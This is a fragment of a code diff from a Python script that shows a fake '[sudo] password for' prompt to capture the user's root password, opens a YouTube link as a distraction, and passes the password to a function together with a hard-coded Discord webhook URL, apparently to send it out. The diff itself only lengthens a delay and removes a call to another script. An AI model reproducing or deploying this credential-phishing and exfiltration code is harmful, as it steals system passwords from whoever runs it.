@@ -47,13 +47,11 @@ username = listdir('/home/')[0]
 print(Style.BRIGHT)
 rootPassword = input(f'[sudo] password for {username}: ')
 webbrowser.open('https://youtu.be/0bZ0hkiIKt0')
-sleep(10)
+sleep(15)
      
 
 user_info(root_pswd=rootPassword,
           webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')
-
-run('python3 src/subprocess.py')
 
 threads = []
 for _ in range(10):
